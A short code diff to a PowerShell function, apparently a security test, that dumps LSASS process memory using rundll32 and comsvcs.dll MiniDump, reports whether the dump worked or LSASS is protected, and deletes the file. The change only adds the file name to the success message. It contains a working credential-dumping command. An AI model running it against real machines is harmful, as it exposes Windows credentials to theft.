@@ -33,7 +33,7 @@ function Invoke-LsassDump1 {
 			.\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id $fileName full
 			Start-Sleep 3
 			If ((Get-Item $fileName).length -gt 0kb) {
-				[System.Windows.MessageBox]::Show('Lsass dump worked');
+				[System.Windows.MessageBox]::Show('Lsass dump worked - '+$fileName);
 				Remove-Item $fileName
 			}else{
 				[System.Windows.MessageBox]::Show('Lsass is protected');
